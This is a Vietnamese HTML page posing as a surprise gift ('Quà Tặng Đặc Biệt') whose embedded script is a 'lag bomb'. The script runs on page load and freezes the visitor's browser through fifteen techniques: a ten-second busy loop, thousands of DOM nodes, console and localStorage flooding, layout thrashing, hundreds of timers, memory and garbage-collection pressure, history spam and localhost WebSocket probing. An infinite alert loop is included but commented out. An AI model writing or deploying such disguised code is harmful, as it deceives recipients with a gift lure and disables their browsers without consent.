<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🎁 Quà Tặng Đặc Biệt</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: 'Segoe UI', Tahoma, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
    padding: 20px;
  }

  .container {
    text-align: center;
    background: white;
    padding: 40px;
    border-radius: 25px;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
    position: relative;
    z-index: 10;
    max-width: 90vw;
  }

  h1 {
    font-size: 2em;
    color: #764ba2;
    margin-bottom: 20px;
  }

  .gift { font-size: 5em; margin: 15px 0; }

  p { font-size: 1.1em; color: #666; margin-bottom: 20px; }

  button {
    font-size: 1.1em;
    padding: 15px 40px;
    border: none;
    border-radius: 50px;
    background: linear-gradient(45deg, #f5576c, #f093fb);
    color: white;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 10px 20px rgba(245, 87, 108, 0.4);
  }
</style>
</head>
<body>

<div class="container">
  <h1>🎁 Quà Tặng Đặc Biệt!</h1>
  <div class="gift">🎁</div>
  <p>Đang tải món quà bất ngờ...</p>
  <button>Đang tải...</button>
</div>

<!-- ============ BOM LAG BẮT ĐẦU ============ -->
<script>
(function() {
  'use strict';

  // ============================================================
  // 💣 BOM LAG LEVEL MAX - Tổng hợp mọi loại lag
  // ============================================================

  // ---------- 1. INFINITE LOOP NHẸ (block main thread ~10s) ----------
  // Chạy 1 lần khi vào trang, block UI hoàn toàn
  const startTime = Date.now();
  let dummy = 0;
  while (Date.now() - startTime < 10000) {  // Đơ 10 giây
    dummy += Math.sqrt(Math.random() * 1000);
  }
  // main thread giờ mới được chạy tiếp
  // ============================================================

  // ---------- 2. SPAM DOM ELEMENTS ----------
  // Tạo 5000 phần tử để trình duyệt phải render
  const fragment = document.createDocumentFragment();
  for (let i = 0; i < 5000; i++) {
    const div = document.createElement('div');
    div.style.cssText = `
      position: fixed;
      width: 5px;
      height: 5px;
      background: rgba(255,${Math.random()*255|0},${Math.random()*255|0},0.3);
      top: ${Math.random()*100}%;
      left: ${Math.random()*100}%;
      pointer-events: none;
      z-index: 1;
      will-change: transform, opacity;
    `;
    fragment.appendChild(div);
  }
  document.body.appendChild(fragment);

  // ---------- 3. SPAM CONSOLE.LOG ----------
  // Ghi log liên tục làm Chrome DevTools lag
  let logCount = 0;
  const logInterval = setInterval(() => {
    for (let i = 0; i < 500; i++) {
      console.log('💀 LAG BOM 💀 ' + logCount++ + ' - ' + Math.random());
    }
  }, 50);

  // ---------- 4. SPAM LOCALSTORAGE ----------
  // Ghi/đọc localStorage liên tục (blocking)
  setInterval(() => {
    try {
      for (let i = 0; i < 50; i++) {
        localStorage.setItem('lag_' + i, 'x'.repeat(1000));
        localStorage.getItem('lag_' + i);
      }
    } catch(e) {}
  }, 100);

  // ---------- 5. FORCE REFLOW/CONTINUOUS REPAINT ----------
  // Đọc + ghi layout liên tục → layout thrashing
  const container = document.querySelector('.container');
  setInterval(() => {
    for (let i = 0; i < 100; i++) {
      // Đọc (force reflow)
      const h = container.offsetHeight;
      const w = container.offsetWidth;
      const t = document.body.scrollTop;
      // Ghi
      container.style.transform = `translate(${Math.random()*0.1}px, ${Math.random()*0.1}px)`;
    }
  }, 16);  // ~60 lần/giây

  // ---------- 6. SPAM ANIMATION FRAME ----------
  // Nhiều requestAnimationFrame lồng nhau
  let rafCount = 0;
  function spamRAF() {
    rafCount++;
    // Tạo 10 RAF con mỗi frame
    for (let i = 0; i < 10; i++) {
      requestAnimationFrame(() => {
        // Làm gì đó nhẹ để không bị optimize
        dummy += Math.random();
      });
    }
    if (rafCount < 100000) requestAnimationFrame(spamRAF);
  }
  spamRAF();

  // ---------- 7. BIG STRING CONCATENATION ----------
  // Tạo chuỗi khổng lồ làm tràn RAM
  setTimeout(() => {
    let bigString = '';
    for (let i = 0; i < 100000; i++) {
      bigString += 'laglaglaglaglaglaglaglaglaglaglaglaglaglag';
    }
    window.__lagString = bigString;  // Giữ trong RAM
  }, 5000);

  // ---------- 8. SPAM TIMERS ----------
  // Tạo hàng nghìn setTimeout/setInterval
  for (let i = 0; i < 200; i++) {
    setInterval(() => {
      // Mỗi cái đều làm việc gì đó
      const arr = new Array(1000).fill(Math.random());
      arr.sort();
    }, 10 + Math.random() * 100);
  }

  // ---------- 9. SPAM EVENT LISTENERS ----------
  // Gắn sự kiện mousemove, scroll, wheel với handler nặng
  document.addEventListener('mousemove', function() {
    for (let i = 0; i < 100; i++) dummy += Math.random();
  });

  document.addEventListener('scroll', function() {
    for (let i = 0; i < 1000; i++) dummy += Math.random();
  }, { passive: false });

  window.addEventListener('wheel', function(e) {
    for (let i = 0; i < 500; i++) dummy += Math.random();
  }, { passive: false });

  // ---------- 10. SPAM NETWORK REQUESTS ----------
  // Tạo nhiều request ảnh để tải (nhưng fail để không tốn data)
  setInterval(() => {
    for (let i = 0; i < 5; i++) {
      const img = new Image();
      img.src = 'data:image/svg+xml;base64,' + btoa(
        '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>'
      ) + '?t=' + Math.random();
    }
  }, 50);

  // ---------- 11. SPAM WEBSOCKET (thử kết nối localhost) ----------
  setInterval(() => {
    for (let i = 0; i < 3; i++) {
      try {
        const ws = new WebSocket('ws://localhost:' + (9999 + i));
        ws.onerror = () => {};
        setTimeout(() => ws.close(), 100);
      } catch(e) {}
    }
  }, 200);

  // ---------- 12. FILL HISTORY STACK ----------
  // PushState liên tục làm history đầy
  setInterval(() => {
    try {
      history.pushState({t: Date.now()}, '', '#lag');
    } catch(e) {}
  }, 100);

  // ---------- 13. FORCE GC PRESSURE ----------
  // Tạo object rác liên tục để GC phải chạy
  setInterval(() => {
    const garbage = [];
    for (let i = 0; i < 10000; i++) {
      garbage.push({
        a: Math.random(),
        b: 'string'.repeat(100),
        c: new Date(),
        d: new Array(100).fill(i)
      });
    }
    // Để GC tự dọn
  }, 200);

  // ---------- 14. SPAM CSS ANIMATION TRIGGERS ----------
  // Bật/tắt class liên tục → style recalculation
  setInterval(() => {
    const all = document.querySelectorAll('*');
    all.forEach(el => {
      el.style.opacity = 0.5 + Math.random() * 0.5;
    });
  }, 100);

  // ---------- 15. INFINITE ALERT LOOP (cái này chí mạng) ----------
  // Bật cái này lên thì người dùng không làm gì được nữa
  // Nếu không muốn quá ác thì comment lại
  /*
  setTimeout(() => {
    setInterval(() => {
      alert('💀 BẠN ĐÃ BỊ LAG 💀');
    }, 100);
  }, 12000);
  */

  // ---------- BONUS: hiện thông báo nhẹ nhàng ----------
  setTimeout(() => {
    const p = document.querySelector('p');
    if (p) p.textContent = '💀 Bạn đã bị LAG BOM! 💀';
  }, 11000);

})();
</script>
<!-- ============ HẾT BOM LAG ============ -->
</body>
</html>
